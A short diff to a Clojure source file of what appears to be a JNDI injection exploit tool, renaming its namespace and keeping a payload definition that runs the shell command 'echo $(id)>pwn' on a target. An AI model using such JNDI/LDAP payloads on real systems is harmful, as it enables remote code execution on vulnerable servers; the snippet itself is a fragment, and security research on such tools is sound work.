@@ -1,7 +1,8 @@
-(ns jndi-clj.core
+(ns jndi-injector-clj.core
+  (:gen-class)
   (:import [org.pwn
             Payload])
-  (:require [jndi-clj.ldap :as ldap]
+  (:require [jndi-injector-clj.ldap :as ldap]
             [ring.adapter.jetty :as jetty]))
 
 (def payload (Payload/build "echo $(id)>pwn") )
